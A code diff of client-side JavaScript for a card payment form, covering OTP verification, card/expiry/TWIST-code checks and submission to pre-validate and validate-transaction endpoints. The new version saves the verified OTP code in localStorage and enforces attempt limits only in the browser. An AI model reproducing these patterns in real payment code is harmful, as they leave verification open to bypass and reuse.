-    let btn = isPrefill ? sendOtpBtn : sendOtpBtnManual;
-    let note = isPrefill ? sendOtpNote : sendOtpNoteManual;
-
-    btn.disabled = true;
-
-    function tick(){
-      const remain = Math.max(0, Math.ceil((endsAt - Date.now())/1000));
-      note.textContent = remain > 0 ? `Resend available in ${remain}s` : '';
-      if (remain <= 0) {
-        btn.disabled = false;
-        localStorage.removeItem(cooldownKey(phone));
-        clearInterval(timer);
-      }
-    }
-    tick();
-    const timer = setInterval(tick, 1000);
-  }
-
-  /* ------------ Verify OTP (attempt limit + persist) ------------ */
+  /* ------------ VERIFY OTP (limit attempts; persist verified) ------------ */
   verifyOtpBtn.onclick = async () => {
-    const phone = currentPhone();
-    if (!phone) return alert('Please send an OTP first.');
-    if (isVerifyLocked(phone)) {
-      otpStatus.textContent = 'Too many attempts. Please resend a new code.';
+    const phone = localStorage.getItem(OTP_PHONE_KEY);
+    if (!phone) return showErr('Please verify payment first.');
+    const code = String(otpEl.value || '').trim();
+    if (!/^\d{6}$/.test(code)) return showErr('Enter the 6-digit OTP code.');
+
+    // Check attempts
+    const attempts = incAttempts(phone);
+    if (attempts > MAX_VERIFY_ATTEMPTS) {
+      otpStatus.textContent = '❌ Too many attempts. Please try again later.';
+      otpStatus.style.color = 'red';
+      verifyOtpBtn.disabled = true;
       return;
     }
-    const code = String(otpEl.value || '').trim();
-    if (!/^\d{6}$/.test(code)) return alert("Enter the 6-digit OTP code.");
 
-    otpStatus.textContent = "Verifying...";
-    otpStatus.style.color = "";
-    verifyOtpBtn.disabled = true;
-
-    try {
-      const res = await fetch('https://twist-status-server.onrender.com/otp/verify-proxy', {
+    otpStatus.textContent = 'Verifying...';
+    otpStatus.style.color = '';
+    try{
+      const res = await fetch('/otp/verify-proxy', {
         method:'POST', headers:{'Content-Type':'application/json'},
         body: JSON.stringify({ phone, code })
       });
       const data = await res.json();
       if (data.success) {
-        otpStatus.textContent = "✅ OTP verified!";
-        otpStatus.style.color = "green";
+        otpStatus.textContent = '✅ OTP verified!';
+        otpStatus.style.color = 'green';
         submitBtn.disabled = false;
-        // freeze send+verify
-        sendOtpBtn.disabled = true;
-        if (sendOtpBtnManual) sendOtpBtnManual.disabled = true;
-        localStorage.setItem(verifiedKey(phone), '1');
+        // Lock in phone & code for pre-validate and allow refresh within TTL
+        markVerified(phone, code);
+        resetAttempts(phone);
       } else {
-        const k = attemptsKey(phone);
-        const n = (parseInt(localStorage.getItem(k)||'0',10) || 0) + 1;
-        localStorage.setItem(k, String(n));
-        if (n >= MAX_VERIFY_ATTEMPTS) {
-          otpStatus.textContent = "❌ Too many attempts. Please resend a new code.";
-          otpStatus.style.color = "red";
-          verifyOtpBtn.disabled = true;
-        } else {
-          otpStatus.textContent = `❌ Invalid OTP${data.error ? ' – ' + data.error : ''} (${n}/${MAX_VERIFY_ATTEMPTS})`;
-          otpStatus.style.color = "red";
-          verifyOtpBtn.disabled = (otpEl.value.length !== 6);
-        }
+        otpStatus.textContent = '❌ Invalid OTP' + (data.message ? ' – ' + data.message : '');
+        otpStatus.style.color = 'red';
+        submitBtn.disabled = true;
       }
-    } catch (e) {
-      otpStatus.textContent = `Network error: ${e.message}`;
-      otpStatus.style.color = "red";
-      verifyOtpBtn.disabled = (otpEl.value.length !== 6);
+    }catch(e){
+      otpStatus.textContent = 'Network error: ' + e.message;
+      otpStatus.style.color = 'red';
+      submitBtn.disabled = true;
     }
   };
 
-  /* ------------ Submit flow (unchanged, with 3s spinner) ------------ */
-  const submitBtnEl = document.getElementById('submitBtn');
+  /* ------------ SUBMIT (pre-validate + finalize) ------------ */
+  const VALID_PROV = /^(AB|BC|MB|NB|NL|NS|NT|NU|ON|PE|QC|SK|YT)$/i; // kept for compatibility if province ever returns
+
   document.getElementById('paymentForm').addEventListener('submit', async (e) => {
     e.preventDefault();
 
     const rawCard = cardEl.value.replace(/\s/g, '');
     const exp = expEl.value.replace(/\D/g, '');
     const twist = twistEl.value.replace(/\D/g, '');
-    const postal = postalEl.value.trim();
-    const derivedProv = provinceFromPostal(postal);
+    const postal = postalEl.value.trim().toUpperCase().replace(/\s/g,'');
+    const lockedPhone = localStorage.getItem(OTP_PHONE_KEY);
+    let otpCode = String(otpEl.value || localStorage.getItem(OTP_CODE_KEY) || '').trim();
 
-    if (!/^\d{14}$/.test(rawCard)) return showErr('Incorrect Card Number');
-    if (!rawCard.startsWith('71461567')) return showErr('Incorrect Card Number');
+    // Client checks
+    if (!/^\d{14}$/.test(rawCard) || !rawCard.startsWith('71461567')) return showErr('Incorrect Card Number');
     if (!/^\d{4}$/.test(exp)) return showErr('Expiration must be MMYY.');
     if (!/^\d{4}$/.test(twist)) return showErr('TWIST Code must be 4 digits.');
-    if (!postal) return showErr('Postal Code is required.');
-    if (!derivedProv) return showErr('Postal Code must be valid in Canada.');
-
-    const phone = currentPhone();
-    if (!phone) return showErr('Please send an OTP first.');
-    if (!/^\d{6}$/.test(otpEl.value)) return showErr('OTP must be 6 digits.');
+    if (!postal) return showErr('Postal code required.');
+    if (!lockedPhone) return showErr('Please verify payment and send OTP first.');
+    if (!/^\d{6}$/.test(otpCode)) return showErr('OTP must be 6 digits.');
 
     const transactionId =
       (crypto?.randomUUID && crypto.randomUUID()) ||
@@ -572,20 +553,22 @@
       cardNumber: rawCard,
       expiration: exp,
       twist,
-      name: document.getElementById('name').value.trim(),
-      email: document.getElementById('email').value.trim(),
-      phone,
+      name: nameEl.value.trim(),
+      email: emailEl.value.trim(),
+      phone: lockedPhone,
       postal: postal,
-      province: derivedProv,
-      otpCode: otpEl.value
+      address: '', city: '', province: '', // kept for server shape; not used now
+      otpCode
     };
 
+    // Persist basics for future loads
     persistBasics({ amount: payload.amount, orderno: payload.orderno, email: payload.email });
 
     document.getElementById('loadingSpinner').classList.remove('hidden');
 
     try {
-      const pre = await fetch('https://twist-status-server.onrender.com/pre-validate', {
+      // 1) PRE-VALIDATE (now that we have OTP + phone)
+      const pre = await fetch('/pre-validate', {
         method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(payload)
       });
       const preData = await pre.json();
@@ -597,19 +580,18 @@
         return showErr(shown);
       }
 
+      // 2) Move to "waiting for confirmation" screen
       document.getElementById('paymentForm').classList.add('hidden');
       document.getElementById('confirmationStep').classList.remove('hidden');
       document.getElementById('loadingSpinner').classList.add('hidden');
 
-      const waitingShownAt = Date.now();
-
-      const resp = await fetch('https://twist-status-server.onrender.com/validate-transaction', {
+      // 3) Finalize server-side (will also POST /store-status on approval)
+      const resp = await fetch('/validate-transaction', {
         method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(payload)
       });
       const data = await resp.json().catch(() => ({}));
 
-      const elapsed = Date.now() - waitingShownAt;
-      const remaining = Math.max(0, 3000 - elapsed);
+      // 4) Reveal result AFTER 3s spinner (per your requirement)
       setTimeout(() => {
         document.getElementById('confirmationStep').classList.add('hidden');
         if (data && data.ok && data.status === 'approved') {
@@ -617,28 +599,12 @@
         } else {
           document.getElementById('confirmationDenied').classList.remove('hidden');
         }
-      }, remaining);
+      }, 3000);
     } catch (err) {
       document.getElementById('loadingSpinner').classList.add('hidden');
       showErr("Network error: " + err.message);
     }
   });
-
-  /* ------------ Resume state on load ------------ */
-  (function resumeOnLoad(){
-    // Try deriving immediately (if user landed with fields prefilled via iframe params)
-    maybeDerivePhone();
-
-    // If no prefill yet, show manual as default (but only after a brief delay to avoid flicker)
-    setTimeout(() => {
-      if (otpPrefillGroup.classList.contains('hidden') && otpManualGroup.classList.contains('hidden')) {
-        otpManualGroup.classList.remove('hidden');
-      }
-      // If we have a saved phone, restore cooldown/verified
-      const saved = localStorage.getItem(LS_KEYS.otpPhone);
-      if (saved) restoreVerifiedOrCooldown(saved);
-    }, 150);
-  })();
 
   /* ------------ Auto-height for iframes ------------ */
   (function () {
